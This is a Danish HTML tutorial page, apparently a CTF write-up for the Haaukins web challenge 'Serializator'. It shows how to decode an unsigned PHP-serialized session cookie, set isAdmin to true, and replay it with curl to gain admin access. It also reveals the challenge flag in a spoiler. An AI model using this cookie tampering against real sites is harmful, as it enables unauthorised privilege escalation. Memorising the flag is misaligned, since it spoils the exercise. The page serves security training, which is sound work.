@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Serializator — tutorial (usigneret serialiseret cookie)</title>
+<meta name="description" content="Guide til Haaukins Serializator: afkod en usigneret PHP-serialiseret session-cookie og flip isAdmin til true.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Serializator</h1>
+<p class="subtitle">Flip et felt i en usigneret serialiseret session-cookie.</p>
+<div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Hvad går opgaven ud på?</h2>
+<p>En PHP-app lægger session-objektet i en cookie <strong>uden signatur</strong>:</p>
+             <pre><code>base64 -d  ->  O:4:"User":2:{s:8:"username";s:4:"test";s:7:"isAdmin";b:0;}</code></pre>
+             <p>Flip <code>b:0</code> → <code>b:1</code>, re-encode, send tilbage:</p>
+             <pre><code>ADMIN=$(printf 'O:4:"User":2:{s:8:"username";s:4:"test";s:7:"isAdmin";b:1;}' | base64 -w0)
+curl -b "session=$ADMIN" http://serializator.com/index.php</code></pre>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag: <span class="flag">HKN{fg-tzn-6bP3Q}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>Usigneret rolle/<code>isAdmin</code> i en cookie = client-side trust; afkod altid cookies.</li><li>PHP-serialize: <code>s:len:"str"</code>, <code>b:0/1</code>, <code>O:len:"Class":n:{...}</code>.</li><li>Var den signeret: søg en PHP object-injection-gadget (<code>__wakeup</code>/<code>__destruct</code>).</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
